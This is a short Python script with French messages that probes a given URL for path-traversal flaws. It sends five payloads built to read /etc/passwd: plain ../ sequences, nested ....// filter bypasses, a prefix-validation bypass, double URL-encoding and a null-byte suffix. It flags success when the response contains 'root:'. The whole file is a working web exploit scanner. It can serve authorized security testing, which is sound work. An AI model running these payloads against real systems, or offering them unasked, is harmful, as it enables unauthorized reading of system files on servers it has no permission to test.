import requests
import sys

if len(sys.argv) != 2:
    print("Seulement un argument doit être passé !")
    sys.exit(1)

url = sys.argv[1]

s = requests.Session()

test = {
    "L'Accès direct" : "../../../etc/passwd",
    "L'accès filtre récursif" : "....//....//....//etc/passwd",
    "La validation du préfixe" : "/var/www/images/../../../etc/passwd",
    "Le double décodage" : "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
    "Le byte null" : "../../../etc/passwd%00.jpg"
}


for nom, ajout in test.items():

    lien = f"{url}{ajout}"

    try :
        reponse = s.get(lien, timeout=5)

    except requests.exceptions.RequestException as e:
        print(f"Erreur réseau : {e}")
        continue
    
    if reponse.status_code == 200 and "root:" in reponse.text:
        print(f"Attention ! {nom} est possible")
    else:
        print(f"{nom} n'est pas possible.")

